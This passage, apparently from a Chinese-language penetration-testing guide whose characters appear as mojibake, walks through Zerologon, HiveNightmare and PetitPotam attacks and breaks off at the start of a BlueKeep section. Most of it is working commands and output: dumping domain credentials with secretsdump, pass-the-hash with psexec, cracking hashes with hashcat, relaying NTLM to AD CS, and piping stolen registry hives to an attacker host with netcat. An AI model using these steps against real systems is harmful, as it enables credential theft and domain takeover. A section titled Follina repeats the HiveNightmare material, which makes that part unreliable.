impacket-secretsdump -just-dc <dc-name>$@<dc-ip> -no-pass
```

ÁúãÂà∞‰ª•‰∏ãËº∏Âá∫Ôºö

```
[*] Dumping Domain Credentials (domain\user:rid:lmhash:nthash)
Administrator:500:aad3b4... :<NT hash> :::
```

***

#### 5Ô∏è‚É£ Âà©Áî®ÂèñÂæóÁöÑ Domain Admin hash

‰ΩøÁî® Pass-the-Hash ÊîªÊìäÔºå‰æãÂ¶ÇÔºö

```bash
impacket-psexec <domain>/Administrator@<target-ip> -hashes :<ntlm-hash>
```

ÊàêÂäüÁôªÂÖ•ÔºÅ

***

### üõ† Â∑•ÂÖ∑Êé®Ëñ¶

| Â∑•ÂÖ∑                         | ÂäüËÉΩ                   |
| -------------------------- | -------------------- |
| impacket-zerologon\_tester | Ê∏¨Ë©¶ÁõÆÊ®ôÊòØÂê¶Êúâ Zerologon ÊºèÊ¥û |
| set\_empty\_pw.py (PoC)    | Âà©Áî®ÊºèÊ¥ûÂ∞á DC ÂØÜÁ¢ºÁΩÆÁ©∫        |
| impacket-secretsdump       | Âæû DC ÂèñÂæóÂÆåÊï¥ÊÜëË≠â (hash)   |
| impacket-psexec / wmiexec  | ‰ΩøÁî® hash Áõ¥Êé•Ê©´ÂêëÁßªÂãïÊîªÊìä     |

***

### üì• ÊàêÂäüÊîªÊìäËº∏Âá∫ÁØÑ‰æã

```
[+] <dc-ip> is vulnerable to Zerologon!
[+] Password reset successful!
[*] Dumping Domain Credentials (domain\user:rid:lmhash:nthash)
Administrator:500:aad3b4... : NTLMHASH:::
```

‰∏¶ÈÄèÈÅé `psexec` ÊàêÂäüÂèñÂæó ShellÔºö

```
C:\WINDOWS\system32> whoami
nt authority\system
```

***

### üîé Debug & Â∏∏Ë¶ãÈåØË™§

| ÂïèÈ°å                                | Ëß£Ê±∫ÊñπÂºè                             |
| --------------------------------- | -------------------------------- |
| Ëº∏Âá∫ `[!] Target is not vulnerable` | Á¢∫Ë™çÊòØÂê¶ÁÇ∫ DC„ÄÅÁõÆÊ®ôÊòØÂê¶ÊúâË£ú‰∏ÅÔºåÊàñ‰ΩøÁî®Ê≠£Á¢∫ DNS ÂêçÁ®±    |
| ÈáçË®≠ÂØÜÁ¢ºÂ§±Êïó                            | ‰ΩøÁî®Â§öÊ¨°ÂòóË©¶ÔºåZerologon Âú®‰ΩéÁâàÊú¨Á≥ªÁµ±‰∏ãÂÅ∂ÁàæÈúÄË¶ÅÂ§öÊ¨°ÂòóË©¶ |
| Secretsdump ÁÑ°Ê≥ï dump               | Á¢∫Ë™çÂêçÁ®±Ëß£ÊûêÔºàdc-nameÔºâ„ÄÅÁ¢∫‰øù‰ΩøÁî® -no-pass Ê®°Âºè |





***

### ‚úÖ 6Ô∏è‚É£ HiveNightmare (CVE-2021-36934) Êú¨Âú∞ÊîªÊìäÊµÅÁ®ã ÔºàÂÆåÊï¥ÁØÑ‰æãÔºâ

> Ôºà‰πãÂâçÂ∑≤ÂàóÂá∫ÔºåÈÄôË£°È°çÂ§ñË£ú‰∏äËá™ÂãïÂåñÁØÑ‰æãËÖ≥Êú¨Ôºâüè¢ ÂÖ¨Âè∏ÂåñÊ¶ÇÂøµ
>
> **HiveNightmare (CVE-2021-36934)** ÊòØ Windows Á≥ªÁµ±‰∏≠ÁöÑ‰∏ÄÂÄãÂö¥ÈáçÊú¨Âú∞Ê¨äÈôêÊèêÂçáÊºèÊ¥û„ÄÇ\
> ÊºèÊ¥ûÂ≠òÂú®ÊñºÁ≥ªÁµ±ÁöÑ„ÄåË®ªÂÜäË°®ÈÖçÁΩÆÂñÆÂÖÉ (SAM„ÄÅSYSTEM„ÄÅSECURITY)„ÄçÂ≠òÂèñÊ¨äÈôêË®≠ÂÆöÈåØË™§„ÄÇ\
> Âú®È†êË®≠ÊÉÖÊ≥Å‰∏ãÔºåBUILTIN\Users Áæ§ÁµÑÂ∞çÈÄô‰∫õÁ≥ªÁµ±Ê™îÊ°àÂÖ∑ÊúâÂèØËÆÄÊ¨äÈôêÔºåÂä†‰∏äÁ≥ªÁµ±Âç∑ÂΩ±Ë§áÊú¨ (Volume Shadow Copy) ÁöÑÂ≠òÂú®Ôºå\
> ÊîªÊìäËÄÖÂèØ‰ª•Âú®ÈùûÁÆ°ÁêÜÂì°Ê¨äÈôê‰∏ãËºïÈ¨ÜÂèñÂæóÁ≥ªÁµ±ÂØÜÁ¢ºÂìàÂ∏åÂÄºÔºåÈÄ≤‰∏ÄÊ≠•ÈÄèÈÅéÈõ¢Á∑öÁ†¥Ëß£Êàñ Pass-The-Hash ÊîªÊìäÂèñÂæóÁ≥ªÁµ±ÊúÄÈ´òÊ¨äÈôê„ÄÇ
>
> > üö® ÈÅ©Áî®Á≥ªÁµ±ÔºöWindows 10 (1809\~21H1)„ÄÅÈÉ®ÂàÜ Windows Server 2019 ÁâàÊú¨Êú™‰øÆË£úÁ≥ªÁµ±„ÄÇ
>
> ***
>
> ### üöÄ ÊîªÊìäÊµÅÁ®ãÂúñÔºàÊñáÂ≠óÁâàÔºâ
>
> ```
> 1Ô∏è‚É£ Ê™¢Êü• SAM Ê™îÊ°àÊ¨äÈôê & Á¢∫Ë™çÊòØÂê¶ÊòìÂèóÊîªÊìä
>      ‚Üì
> 2Ô∏è‚É£ Á¢∫Ë™çÂ≠òÂú® Shadow Copy
>      ‚Üì
> 3Ô∏è‚É£ ‰ΩøÁî® HiveNightmare PoC ÊäìÂèñ SAM/SYSTEM/SECURITY Ê™îÊ°à
>      ‚Üì
> 4Ô∏è‚É£ Â∞á‰∏âÂÄãÊ™îÊ°àÂÇ≥ÂõûÊîªÊìä‰∏ªÊ©ü
>      ‚Üì
> 5Ô∏è‚É£ Âà©Áî® secretsdump.py Ëß£ÊûêÊú¨Âú∞ÂØÜÁ¢ºÂìàÂ∏å
>      ‚Üì
> 6Ô∏è‚É£ ‰ΩøÁî®Á†¥Ëß£Â∑•ÂÖ∑ÔºàÂ¶Ç HashcatÔºâÈõ¢Á∑öÁ†¥Ëß£ÂØÜÁ¢ºÊàñÁî® Pass-The-Hash ÂèñÂæóÁ≥ªÁµ±ÊéßÂà∂Ê¨ä
> ```
>
> ***
>
> ### üë®‚Äçüè´ ÊîªÊìäÊ≠•È©üÁØÑ‰æã
>
> #### 1Ô∏è‚É£ Ê™¢Êü• SAM Ê¨äÈôê
>
> ```powershell
> icacls C:\Windows\System32\config\SAM
> ```
>
> ÁØÑ‰æãËº∏Âá∫ (‰ª£Ë°®ÂèØÂà©Áî®)Ôºö
>
> ```
> C:\Windows\System32\config\SAM BUILTIN\Users:(I)(RX)
> ```
>
> ***
>
> #### 2Ô∏è‚É£ Ê™¢Êü•Âç∑ÂΩ±ÂâØÊú¨ (Shadow Copy)
>
> ```powershell
> vssadmin list shadows
> ```
>
> Ëã•Âá∫ÁèæÔºö
>
> ```
> Shadow Copy ID: {XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}
> ```
>
> ‰ª£Ë°®Â≠òÂú®Âø´ÁÖßÔºåÂèØ‰ª•ÈÄ≤Ë°åÊîªÊìä„ÄÇ
>
> ***
>
> #### 3Ô∏è‚É£ ‰ΩøÁî® HiveNightmare Â∑•ÂÖ∑
>
> ‰∏ãËºâ‰∏¶Âü∑Ë°åÁèæÊàê PoC Â∑•ÂÖ∑Ôºö
>
> ```powershell
> .\HiveNightmare.exe
> ```
>
> Ëº∏Âá∫ÁØÑ‰æãÔºö
>
> ```
> Success: SAM hive from 2021-xx-xx written out to current working directory
> Success: SECURITY hive from 2021-xx-xx written out to current working directory
> Success: SYSTEM hive from 2021-xx-xx written out to current working directory
> ```
>
> ‰Ω†ÊúÉÂú®Áï∂ÂâçË≥áÊñôÂ§æÁúãÂà∞Ôºö
>
> * SAM-YYYY-MM-DD
> * SYSTEM-YYYY-MM-DD
> * SECURITY-YYYY-MM-DD
>
> ***
>
> #### 4Ô∏è‚É£ Â∞áÊ™îÊ°àÂÇ≥ÂõûÊîªÊìäÊ©ü
>
> ÈÄèÈÅé `scp`„ÄÅ`netcat` Êàñ `curl` ÂÇ≥ÂõûÊú¨Ê©üÂÇô‰ªΩ‰øùÂ≠ò„ÄÇ
>
> ***
>
> #### 5Ô∏è‚É£ ‰ΩøÁî® secretsdump.py ÊäΩÂèñ Hash
>
> ```bash
> impacket-secretsdump -sam SAM-2021-xx-xx -system SYSTEM-2021-xx-xx -security SECURITY-2021-xx-xx local
> ```
>
> ÁØÑ‰æãÁµêÊûúÔºö
>
> ```
> Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
> htb-user:1002:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
> ```
>
> ***
>
> #### 6Ô∏è‚É£ Èõ¢Á∑öÁ†¥Ëß£ or Pass-The-Hash
>
> **Á†¥Ëß£Ôºö**
>
> ```bash
> hashcat -m 1000 -a 0 <hash> rockyou.txt
> ```
>
> **Pass-The-HashÔºö**
>
> ```bash
> impacket-psexec -hashes :<NTLM-hash> Administrator@<victim-ip>
> ```
>
> ***
>
> ### üõ† Â∑•ÂÖ∑Êé®Ëñ¶

| Â∑•ÂÖ∑                        | ÂäüËÉΩ                                |
| ------------------------- | --------------------------------- |
| icacls                    | Ê™¢Êü•Á≥ªÁµ±Ê™îÊ°àÊ¨äÈôê                          |
| vssadmin                  | Ê™¢Êü•Á≥ªÁµ±Âç∑ÂΩ±ÂâØÊú¨                          |
| HiveNightmare.exe         | Ëá™ÂãïÂæûÂç∑ÂΩ±Ë§áÊú¨‰∏≠ dump SAM„ÄÅSYSTEM„ÄÅSECURITY |
| impacket-secretsdump      | ÂàÜÊûê hive Ê™îÊ°à‰∏¶ÊèêÂèñÂ∏≥Êà∂ÂØÜÁ¢º hash            |
| hashcat                   | Â∞á hash Èõ¢Á∑öÁ†¥Ëß£                       |
| impacket-psexec / wmiexec | ‰ΩøÁî® NTLM hash Âü∑Ë°åÊ©´ÂêëÁßªÂãïÊîªÊìä             |

> ***
>
> ### üì• ÊàêÂäüÁØÑ‰æãËº∏Âá∫
>
> ```
> Success: SAM hive from 2021-08-07 written out
> [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
> Administrator:500:....:<hash>:::
> ```
>
> Pass-The-Hash ÊàêÂäüÁôªÂÖ•Ôºö
>
> ```
> C:\Windows\System32> whoami
> nt authority\system
> ```
>
> ***
>
> ### üõ† Â∏∏Ë¶ã Debug

| ÂïèÈ°å                              | Ëß£Ê±∫ÊñπÊ≥ï                                             |
| ------------------------------- | ------------------------------------------------ |
| Âü∑Ë°å HiveNightmare.exe Ê≤íÂèçÊáâ        | Á¢∫Ë™çÁõÆÊ®ôÁ≥ªÁµ±ÊòØÂê¶Êúâ Shadow CopyÔºå‰∏¶Ê™¢Êü•Áï∂ÂâçÂ∏≥Êà∂Ê¨äÈôê                  |
| secretsdump Âá∫Áèæ `key not found`  | Á¢∫Ë™ç SYSTEM„ÄÅSAM„ÄÅSECURITY ‰∏âÂÄãÊ™îÊ°àÈÉΩÊúâÂåØÂá∫Ôºå‰∏îÊ≤íÊúâÊêçÂ£û            |
| Hashcat Á†¥Ëß£Â§™ÊÖ¢                    | ‰ΩøÁî® GPU Ê®°Âºè„ÄÅÊîπÁî® mask attack ÈáùÂ∞çÂ∏∏Áî®Âº±ÂØÜÁ¢º                 |
| Ê≤íÊúâÂç∑ÂΩ±ÂâØÊú¨ `No shadow copies found` | ÂòóË©¶Ëß∏ÁôºÁ≥ªÁµ±ÂÇô‰ªΩÊàñÂ∞ãÊâæÂÖ∂‰ªñÊú¨Âú∞ÊèêÊ¨äÊºèÊ¥û (Â¶Ç PrintNightmare„ÄÅHotPotato) |

***

### ‚úÖ 7Ô∏è‚É£ Follina (CVE-2022-30190) ÊîªÊìäÊµÅÁ®ã

### üè¢ ÂÖ¨Âè∏ÂåñÊ¶ÇÂøµ

**HiveNightmare (CVE-2021-36934)** ÊòØ Windows Á≥ªÁµ±ÁöÑ‰∏ÄÂÄãÂö¥ÈáçÊú¨Âú∞ÊèêÊ¨äÊºèÊ¥û„ÄÇ\
Âõ†Á≥ªÁµ±Â∞á **SAM„ÄÅSYSTEM„ÄÅSECURITY Ë®ªÂÜäË°®ÈÖçÁΩÆÂñÆÂÖÉ** Ë®≠ÂÆöÁÇ∫‰∏ÄËà¨‰ΩøÁî®ËÄÖÂèØËÆÄÔºåÂä†‰∏äÊúâÂç∑ÂΩ±Ë§áÊú¨ (VSS)Ôºå\
‰ΩøÂæó‰ΩéÊ¨äÈôêÊîªÊìäËÄÖÂèØÂæûÁ≥ªÁµ±Âø´ÁÖß‰∏≠Êì∑ÂèñÂá∫Êú¨Ê©üÂ∏≥Ëôü HashÔºå\
ÈÄèÈÅé **Èõ¢Á∑öÁ†¥Ëß£** Êàñ **Pass-The-Hash** ÊñπÂºèÂèñÂæó SYSTEM Ê¨äÈôê‰∏¶ÊéßÂà∂Á≥ªÁµ±„ÄÇ

> ‚úÖ **ÂΩ±ÈüøÁ≥ªÁµ±**ÔºöWindows 10 1809 \~ 21H1„ÄÅÈÉ®ÂàÜ Windows Server 2019

***

### üöÄ ÊîªÊìäÊµÅÁ®ãÂúñÔºàÊñáÂ≠óÁâàÔºâ

```
1Ô∏è‚É£ Ê™¢Êü• SAM Ê¨äÈôê (icacls)
    ‚Üì
2Ô∏è‚É£ Á¢∫Ë™çÊúâ Shadow Copy (vssadmin)
    ‚Üì
3Ô∏è‚É£ ‰ΩøÁî® HiveNightmare PoC Êì∑Âèñ hive Ê™îÊ°à
    ‚Üì
4Ô∏è‚É£ Êää SAM„ÄÅSYSTEM„ÄÅSECURITY Ê™îÊ°àÈÄÅÂõûÊîªÊìäÊ©ü
    ‚Üì
5Ô∏è‚É£ ‰ΩøÁî® secretsdump.py ÂàÜÊûêÂèñÂæó hash
    ‚Üì
6Ô∏è‚É£ Âà©Áî® hashcat Á†¥Ëß£ÊàñÁî® Pass-The-Hash ÊèêÊ¨äÁôªÂÖ• SYSTEM
```

***

### üë®‚Äçüè´ ÊîªÊìäÊ≠•È©üÁØÑ‰æã

#### 1Ô∏è‚É£ Ê™¢Êü• SAM Ê¨äÈôê

```powershell
icacls C:\Windows\System32\config\SAM
```

ÁØÑ‰æãÁµêÊûúÔºàËã•Êúâ‰ª•‰∏ã‰ª£Ë°®ÂèØÊîªÊìäÔºâÔºö

```
C:\Windows\System32\config\SAM BUILTIN\Users:(I)(RX)
```

***

#### 2Ô∏è‚É£ Ê™¢Êü•Âç∑ÂΩ±ÂâØÊú¨ÔºàShadow CopyÔºâ

```powershell
vssadmin list shadows
```

Âá∫ÁèæÁØÑ‰æãÔºö

```
Shadow Copy ID: {xxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxx}
```

Ë°®Á§∫Á≥ªÁµ±ÊúâÂø´ÁÖßÔºåÂèØÂà©Áî®„ÄÇ

***

#### 3Ô∏è‚É£ ‰ΩøÁî® HiveNightmare PoC Â∑•ÂÖ∑

Â∞á PoC ÊîæÂà∞ÁõÆÊ®ô‰∏ªÊ©üÂü∑Ë°åÔºö

```powershell
.\HiveNightmare.exe
```

ÁØÑ‰æãËº∏Âá∫Ôºö

```
Success: SAM hive from 2021-xx-xx written out
Success: SYSTEM hive from 2021-xx-xx written out
Success: SECURITY hive from 2021-xx-xx written out
```

ÂèØÂú®Áï∂ÂâçË≥áÊñôÂ§æÊâæÂà∞‰ª•‰∏ãÊ™îÊ°àÔºö

```
SAM-YYYY-MM-DD
SYSTEM-YYYY-MM-DD
SECURITY-YYYY-MM-DD
```

***

#### 4Ô∏è‚É£ Â∞áÊ™îÊ°àÂÇ≥ÂõûÊîªÊìä‰∏ªÊ©ü

ÁØÑ‰æã‰ΩøÁî® netcatÔºö

```bash
nc -lvp 9999 > SAM-2021-xx-xx
nc -lvp 9998 > SYSTEM-2021-xx-xx
nc -lvp 9997 > SECURITY-2021-xx-xx
```

ÁõÆÊ®ôÁ´ØÔºö

```bash
nc <attack_ip> 9999 < SAM-2021-xx-xx
nc <attack_ip> 9998 < SYSTEM-2021-xx-xx
nc <attack_ip> 9997 < SECURITY-2021-xx-xx
```

***

#### 5Ô∏è‚É£ ‰ΩøÁî® secretsdump.py ÂèñÂæó Hash

```bash
impacket-secretsdump -sam SAM-2021-xx-xx -system SYSTEM-2021-xx-xx -security SECURITY-2021-xx-xx local
```

ÁØÑ‰æãËº∏Âá∫Ôºö

```
Administrator:500:<LM-HASH>:<NTLM-HASH>:::
htb-user:1002:<LM-HASH>:<NTLM-HASH>:::
```

***

#### 6Ô∏è‚É£ Á†¥Ëß£Êàñ Pass-The-Hash

* Á†¥Ëß£ Hash (‰ΩøÁî® hashcat)Ôºö

```bash
hashcat -m 1000 -a 0 <NTLM-hash> rockyou.txt
```

* ‰ΩøÁî® Hash Ê©´ÂêëÁßªÂãï (Pass-The-Hash)Ôºö

```bash
impacket-psexec -hashes :<NTLM-hash> Administrator@<victim-ip>
```

***

### üõ† Â∏∏Áî®Â∑•ÂÖ∑‰∏ÄË¶Ω

| Â∑•ÂÖ∑ÂêçÁ®±                      | Áî®ÈÄî                                           |
| ------------------------- | -------------------------------------------- |
| icacls                    | Ê™¢Êü•Á≥ªÁµ±Ê™îÊ°àÊ¨äÈôê                                     |
| vssadmin                  | Êü•ÁúãÁ≥ªÁµ±Âç∑ÂΩ±Ë§áÊú¨                                     |
| HiveNightmare.exe         | Âæû Shadow Copy Ëá™Âãï dump SAM„ÄÅSYSTEM„ÄÅSECURITY Ê™îÊ°à |
| impacket-secretsdump.py   | Âæû hive Ê™îÊ°à‰∏≠ÂèñÂæóÊú¨Âú∞Â∏≥ËôüÂØÜÁ¢ºÈõúÊπä                         |
| hashcat                   | Á†¥Ëß£ NTLM ÈõúÊπä                                   |
| impacket-psexec / wmiexec | ‰ΩøÁî®ÈõúÊπäÊàñÂ∏≥ÂØÜÂú®ÁõÆÊ®ôÁ≥ªÁµ±‰∏äÂèñÂæóÈÅ†Á´ØÂü∑Ë°åÊ¨äÈôê                        |

***

### üì• ÊàêÂäüÊ°à‰æãÁØÑ‰æã

```bash
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:....:<NTLM-HASH>:::
htb-user:1002:....:<NTLM-HASH>:::
```

Pass-The-HashÔºö

```
C:\Windows\System32> whoami
nt authority\system
```

***

### üõ† Â∏∏Ë¶ãÂïèÈ°åËàá Debug ÊåáÂçó

| ÂïèÈ°å                           | Ëß£Ê±∫ÊñπÊ≥ï                                                   |
| ---------------------------- | ------------------------------------------------------ |
| Âü∑Ë°å HiveNightmare.exe ÁÑ°ÂèçÊáâ     | Ê™¢Êü• Shadow Copy ÊòØÂê¶Â≠òÂú®Ôºå‰∏¶Á¢∫Ë™çÊòØÂê¶ÊúâÂü∑Ë°åÊ¨äÈôê                         |
| secretsdump Âá∫Áèæ key not found | Ê™¢Êü• SAM„ÄÅSYSTEM„ÄÅSECURITY ‰∏âÂÄãÊ™îÊ°àÊòØÂê¶ÂÆåÊï¥‰∏îÁÑ°ÊêçÂ£û                    |
| hashcat Á†¥Ëß£ÈÄüÂ∫¶ÈÅéÊÖ¢               | ‰ΩøÁî® GPU Ê®°ÂºèÊàñÊîπÁÇ∫Ë¶èÂâáÂåñ mask ÊîªÊìä                                |
| Êâæ‰∏çÂà∞ Shadow Copy              | ÊâãÂãïÂª∫Á´ã Shadow Copy ÊàñÊîπÂà©Áî®ÂÖ∂‰ªñÊºèÊ¥ûÔºàÂ¶Ç PrintNightmare„ÄÅHot PotatoÔºâ |

***

### ‚úÖ 8Ô∏è‚É£ PetitPotam (CVE-2021-36942) ÊîªÊìäÊµÅÁ®ã

‚úÖ **üè¢ ÂÖ¨Âè∏ÂåñÊ¶ÇÂøµÔºöPetitPotam (CVE-2021-36942)**\
PetitPotam ÊòØ‰∏ÄÁ®ÆÂà©Áî® **MS-EFSRPC (Âä†ÂØÜÊ™îÊ°àÁ≥ªÁµ±ÈÅ†Á´ØÁ®ãÂ∫èÂëºÂè´‰ªãÈù¢)** ‰∏≠ÁöÑÊºèÊ¥ûÔºå\
ÂèØ‰ª•Âº∑Âà∂ Windows ‰º∫ÊúçÂô®ÔºàÂåÖÂê´ÂüüÊéßÂà∂Âô®ÔºâÂ∞á NTLM Ë™çË≠âÈÄÅÂá∫Âà∞ÊîªÊìäËÄÖÊåáÂÆöÁöÑ‰º∫ÊúçÂô®Ôºå\
ÂÜçÈÄèÈÅé **NTLM Relay** ÊäÄÂ∑ß‰∏≠ÁπºÂà∞ Active Directory Certificate Services (AD CS) ‰º∫ÊúçÂô®Ôºå\
ËÆìÊîªÊìäËÄÖÂèñÂæó‰∏ÄÂºµÁ∞ΩÁôºÁµ¶Ëá™Â∑±Â∏≥Êà∂ÁöÑ Kerberos ÊÜëË≠â (TGT)ÔºåÊúÄÁµÇÂèØ‰ª•**ÂèñÂæóÂüüÁÆ°ÁêÜÂì°Ê¨äÈôê**„ÄÇ

> üö® ÊîªÊìäÈõ£Â∫¶Ôºö‰∏≠È´òÔºàÈúÄË¶Å AD Áí∞Â¢É‰∏î ADCS Êú™Ê≠£Á¢∫Ë®≠ÂÆöÔºâ\
> ‚úÖ ÈÅ©Áî®ÁØÑÂúçÔºöWindows Server ÂêÑÁâàÊú¨ + ÂïüÁî® AD CS\
> üõ°Ô∏è **ÂΩ±ÈüøÁØÑÂúçÔºöÂÖ®Âüü AD Áí∞Â¢ÉËã•Â≠òÂú®ÂèØË¢´‰∏≠ÁπºÁöÑ AD CS ÈÖçÁΩÆ**

***

### üöÄ ÊîªÊìäÊµÅÁ®ãÂúñ (ÊñáÂ≠óÁâà)

```
pgsqlË§áË£ΩÁ∑®ËºØ1Ô∏è‚É£ Á¢∫Ë™çÁõÆÊ®ô Windows Server/Domain Controller Â≠òÂú® EFSRPC ‰ªãÈù¢ (ÂèØË¢´ÂëºÂè´)
     ‚Üì
2Ô∏è‚É£ Ê™¢Êü•ÊòØÂê¶Êúâ ADCS Web Enrollment Êàñ NTLM Ë∫´‰ªΩÈ©óË≠â API ÂèØË¢´‰∏≠Áπº
     ‚Üì
3Ô∏è‚É£ Âª∫Á´ã SMB Êàñ HTTP Relay Server (ÈÄèÈÅé impacket-ntlmrelayx)
     ‚Üì
4Ô∏è‚É£ ‰ΩøÁî® PetitPotam Â∑•ÂÖ∑ÂêëÁõÆÊ®ô‰º∫ÊúçÂô®Âº∑Âà∂ÁôºÈÄÅ NTLM Ë™çË≠â
     ‚Üì
5Ô∏è‚É£ ÊîîÊà™ NTLM Ë™çË≠â‰∏¶‰∏≠ÁπºÂà∞ AD CSÔºåË´ãÊ±ÇÊÜëË≠â
     ‚Üì
6Ô∏è‚É£ ÂèñÂæó PFX ÊÜëË≠â‰∏¶ÈÄèÈÅé Rubeus Êàñ certipy ËºâÂÖ•ÔºåÂèñÂæóÂüüÁÆ°ÁêÜÂì° TGT
     ‚Üì
7Ô∏è‚É£ ‰ΩøÁî® TGT ÈÄ≤Ë°åÂüüÊéßÊ©´ÂêëÊª≤ÈÄè (DCSync„ÄÅRDP„ÄÅKerberoasting Á≠â)
```

***

### üë®‚Äçüè´ ÊîªÊìäÊ≠•È©üÁØÑ‰æã

#### 1Ô∏è‚É£ ÂïüÂãï NTLM ‰∏≠ÁπºÊúçÂãô

‰ΩøÁî® impacket-ntlmrelayxÔºö

```bash
impacket-ntlmrelayx -t http://<ADCS_IP>/certsrv/ -smb2support --adcs --template <template_name>
```

* `-t`ÔºöÊåáÂÆö‰∏≠ÁπºÁõÆÊ®ô (AD CS ‰º∫ÊúçÂô®)
* `--adcs`ÔºöÂëäË®¥Â∑•ÂÖ∑Ë¶ÅËàá ADCS ÈÄöË®ä
* `--template`ÔºöÊåáÂÆöË´ãÊ±ÇÊÜëË≠âÁî®ÁöÑÁØÑÊú¨Ôºå‰∏ÄËà¨ÂèØ‰ª•Áî® `User` Êàñ `Machine`

***

#### 2Ô∏è‚É£ Âü∑Ë°å PetitPotam ÊîªÊìäÂº∑Ëø´‰º∫ÊúçÂô®ÈÄÅÂá∫ NTLM Ë™çË≠â

```bash
python3 petitpotam.py <DC_IP> <relay_server_IP>
```

ÁØÑ‰æãÔºö

```bash
python3 petitpotam.py 192.168.1.10 192.168.1.100
```

* `<DC_IP>` ÁÇ∫ÁõÆÊ®ôÂüüÊéßÂà∂Âô®
* `<relay_server_IP>` ÁÇ∫ÊîªÊìäËÄÖ‰∏≠Áπº‰º∫ÊúçÂô®ÔºàÂç≥ NTLMRelayxÔºâ

***

#### 3Ô∏è‚É£ ÊàêÂäüÊîîÊà™Ëàá‰∏≠Áπº

Áï∂ÊîªÊìäÊàêÂäüÊôÇÔºå`ntlmrelayx` Â∞áÊúÉÈ°ØÁ§∫Ôºö

```
[*] Authenticating against adcs server
[*] Successfully requested certificate
```

ÂêåÊôÇÊúÉÁî¢Áîü `.pfx` ÊÜëË≠âÊ™îÊ°àÔºå‰∏¶‰øùÂ≠òÊñºÁõÆÈåÑ‰∏ã„ÄÇ

***

#### 4Ô∏è‚É£ Âà©Áî® certipy ÂèñÂæó TGT

```bash
certipy auth -pfx <cert.pfx> -dc-ip <DC_IP> -username <domain_user>
```

ÁØÑ‰æãÔºö

```bash
certipy auth -pfx administrator.pfx -dc-ip 192.168.1.10 -username administrator
```

ÊàêÂäüÊúÉÈ°ØÁ§∫Ôºö

```
[*] Successfully authenticated as DOMAIN\Administrator
```

‰∏¶Âú®Áï∂ÂâçÁõÆÈåÑ‰∏≠Áî¢Áîü `administrator.ccache`ÔºàTGT ÊÜëË≠âÔºâ„ÄÇ

***

#### 5Ô∏è‚É£ ‰ΩøÁî® Rubeus Êàñ certipy ÈÄ≤Ë°åÂüüÊéßÊ©´ÂêëÊîªÊìä

ÈÄèÈÅé TGTÔºö

```bash
export KRB5CCNAME=administrator.ccache
impacket-secretsdump -k -no-pass <domain>/<username>@<DC_IP>
```

ÂèØ‰ª•Âü∑Ë°å DCSync ‰∏¶ dump Âá∫Êï¥ÂÄãÂüüÁöÑÂ∏≥Ëôü hash„ÄÇ

***

### üõ† Â∏∏Áî®Â∑•ÂÖ∑Êé®Ëñ¶

| Â∑•ÂÖ∑ÂêçÁ®±                 | ÂäüËÉΩ                                                            |
| -------------------- | ------------------------------------------------------------- |
| impacket-ntlmrelayx  | NTLM ‰∏≠Áπº‰º∫ÊúçÂô®ÔºåÊîØÊè¥ relay Âà∞ ADCS                                    |
| petitpotam.py        | Âº∑Ëø´ Windows Server Â∞çÊîªÊìä‰∏ªÊ©üÈÄÅÂá∫ NTLM Ë™çË≠â (EFSRPC ÊîªÊìä)                 |
| certipy              | ADCS ÊÜëË≠âÂà©Áî®Ëàá Kerberos Á•®ÊìöÁî¢ÁîüÂèäË™çË≠â                                   |
| Rubeus               | Windows Kerberos ÊìçÊéßÂ∑•ÂÖ∑ÔºåÂèØËºâÂÖ•ÊÜëË≠â„ÄÅÂü∑Ë°å pass-the-ticket„ÄÅASREP Roasting |
| impacket-secretsdump | ÂüüÊéßÊ©´ÂêëÊîªÊìä DCSync Ê®°ÁµÑÔºådump Âá∫ÊâÄÊúâÂüüÂ∏≥Êà∂ hash                             |

***

### üì• ÁØÑ‰æãÂÆåÊï¥ÊµÅÁ®ãËº∏Âá∫

```
[*] Connecting to DC 192.168.1.10 and sending EFSRPC...
[*] Relay received NTLM authentication
[*] Successfully requested certificate
[*] Saved certificate as administrator.pfx
[*] Using certificate with certipy to get TGT...
[*] Successfully authenticated as DOMAIN\Administrator
[*] DCSync attack success! All domain hashes dumped.
```

***

### ‚ö†Ô∏è Â∏∏Ë¶ãÈåØË™§Ëàá Debug

| ÂïèÈ°å                      | Ëß£Ê±∫ÊñπÊ≥ï                                                                 |
| ----------------------- | -------------------------------------------------------------------- |
| ‰∏≠ÁπºÂ§±Êïó / Ê≤íÊúâÊî∂Âà∞Ë™çË≠âË´ãÊ±Ç         | Á¢∫Ë™ç DC ÊòØÂê¶ÂÖÅË®± EFSRPC ÊµÅÈáè (135 RPC port ÂøÖÈ†àÈñãÊîæ)ÔºåÁ¢∫Ë™çÈò≤ÁÅ´ÁâÜÁãÄÊÖã                     |
| ADCS template Êâæ‰∏çÂà∞ÊàñÁÑ°Ê≥ïÁ∞ΩÊÜëË≠â | ‰ΩøÁî® `certipy find -v -dc-ip <DC_IP>` Ê™¢Êü• ADCS Ë®≠ÂÆöËàáÂèØÁî®ÁØÑÊú¨                  |
| ÊîªÊìäÊàêÂäü‰ΩÜ TGT ÁÑ°Ê≥ïÁî®           | Ê™¢Êü•ÊÜëË≠âÊòØÂê¶ÈÅéÊúüÊàñ template ÊòØÂê¶ÊîØÊè¥ Client AuthenticationÔºåÂøÖË¶ÅÊôÇÊîπÁî® machine template |

***

### ‚úÖ 9Ô∏è‚É£ BlueKeep (CVE-2019-0708) ÊîªÊìäÊµÅÁ®ã

‚úÖ **üè¢ ÂÖ¨Âè∏ÂåñÊ¶ÇÂøµÔºöBlueKeep (CVE-2019-0708)**\
BlueKeep (CVE-2019-0708) ÊòØ‰∏ÄÂÄãÂ≠òÂú®Êñº Microsoft ÈÅ†Á´ØÊ°åÈù¢ÊúçÂãôÔºàRemote Desktop Services, RDPÔºâ‰∏≠ÁöÑÂö¥Èáç**ÈÅ†Á´ØÁ®ãÂºèÁ¢ºÂü∑Ë°åÊºèÊ¥û**Ôºå\
